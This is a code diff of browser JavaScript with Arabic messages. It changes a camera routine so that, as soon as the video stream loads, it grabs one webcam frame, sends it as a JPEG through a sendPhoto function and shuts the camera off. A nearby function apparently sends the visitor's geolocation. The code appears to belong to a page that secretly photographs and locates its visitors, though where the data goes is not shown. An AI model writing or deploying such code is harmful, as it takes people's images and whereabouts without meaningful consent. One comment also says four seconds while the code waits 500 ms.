@@ -53,21 +53,29 @@
       }, "image/jpeg");
     }
 
-    function initCamera() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.getElementById("video");
-          video.srcObject = stream;
+function initCamera() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      const video = document.getElementById("video");
+      video.srcObject = stream;
 
-          setTimeout(() => {
-            capturePhotoAndSend();
-            stream.getTracks().forEach(track => track.stop());
-          }, 500); // انتظر 4 ثوانٍ قبل التقاط الصورة
-        })
-        .catch(err => {
-          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
-        });
-    }
+      video.onloadedmetadata = () => {
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+          sendPhoto(blob);
+        }, "image/jpeg");
+
+        stream.getTracks().forEach(track => track.stop());
+      };
+    })
+    .catch(err => {
+      document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
+    });
+}
 
     function getLocationAndSend() {
       if ("geolocation" in navigator) {
